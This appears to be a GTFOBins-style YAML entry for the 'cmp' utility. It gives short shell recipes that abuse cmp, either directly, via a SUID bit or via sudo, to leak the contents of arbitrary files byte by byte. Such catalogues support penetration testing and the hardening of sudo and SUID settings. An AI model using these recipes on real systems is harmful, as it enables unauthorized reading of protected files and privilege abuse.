---
functions:
  file-read:
    - code: |
        LFILE=file-to-read
        TEMP=$(mktemp)
        printf 'A%.0s' {1..999} > $TEMP
        cmp $LFILE $TEMP -b -n 999 -l
  suid:
    - code: |
        LFILE=file-to-read
        TEMP=$(mktemp)
        printf 'a%.0s' {1..999} > $TEMP
        cmp $LFILE $TEMP -b -n 999 -l
  sudo:
    - code: |
        LFILE=file-to-read
        TEMP=$(mktemp)
        printf 'a%.0s' {1..999} > $TEMP
        sudo cmp $LFILE $TEMP -b -n 999 -l
---
